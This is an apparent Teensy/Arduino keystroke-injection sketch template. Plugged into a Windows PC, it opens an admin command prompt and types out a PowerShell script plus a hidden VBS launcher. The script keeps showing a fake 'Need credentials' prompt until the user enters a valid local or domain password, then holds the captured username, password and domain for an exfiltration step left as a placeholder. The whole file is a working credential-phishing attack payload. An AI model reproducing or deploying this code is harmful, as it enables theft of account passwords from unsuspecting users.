#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  Keyboard.begin();
}

void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(F("echo $ErrorActionPreference=\"SilentlyContinue\" > %temp%\\cr.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  Credentials\" >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo Add-Type -assemblyname system.DirectoryServices.accountmanagement  >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $dn = \"LDAP://\" + ([ADSI]\"\").distinguishedName >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo while(1){ >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $cr = $host.ui.PromptForCredential(\"Need credentials\", \"Please enter your user name and password.\", \"\", \"\") >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo if($cr){ >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $creds = $cr.GetNetworkCredential() >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo [String]$u = $creds.username >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo [String]$p = $creds.password >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo [String]$domain = $creds.domain >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $al = $DS.ValidateCredentials($u, $p) >> %temp%\\cr.ps1")); 
  Keyboard.println(F("echo $ad = New-Object System.DirectoryServices.DirectoryEntry($dn,$u,$p) >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo if(($al -eq $true) -or ($ad.name -ne $null)){ >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo $pv = \"Username: \" + $u + \" Password: \" + $p + \" Domain:\" + $domain >> %temp%\\cr.ps1"));
  Keyboard.println(F("echo break}}} >> %temp%\\cr.ps1"));


  String fn = "cr";
  String fp;
  EXFILCALLS


  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\cr.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\cr.ps1\"),0,true >> %temp%\\cr.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\cr.vbs"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true){};
}

  DEFS
  EXFILDEFS
